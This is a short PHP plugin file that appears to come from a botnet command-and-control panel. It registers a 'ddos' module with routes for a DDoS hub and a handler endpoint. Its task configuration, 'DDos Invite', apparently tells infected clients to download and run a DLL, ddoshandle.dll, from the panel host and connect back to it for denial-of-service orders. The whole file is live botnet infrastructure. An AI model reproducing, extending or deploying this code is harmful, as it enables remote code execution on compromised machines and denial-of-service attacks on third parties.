<?php
$pluginName = "ddos";

$GLOBALS["foundPlugins"][$pluginName]["plugindir"] = __DIR__;

require __DIR__."/Controller/ddosController.class.php";
require __DIR__."/Controller/ddosHandlerController.php";





register_navigation_tab("ddos",get_plugin_include_dir("about")."assets/nav/about.svg");
$GLOBALS["task_configuration"]["ddos"] = array(
    "name" => "DDos Invite",
    "command" => "runplugin",
    "value" => "http://".$_SERVER["HTTP_HOST"]."/versions/".$GLOBALS["loadedVersion"]."/plugins/ddos/dll/ddoshandle.dll;BackConnect;".$_SERVER["HTTP_HOST"]."/ddoscontroll",
);

$router->all('/ddos', 'ddosController@ddoshub');
$router->all('/ddosinfo', 'ddosController@ddosinfo');


$router->all('/ddoscontroll', 'ddosHandlerController@ddoscontroll');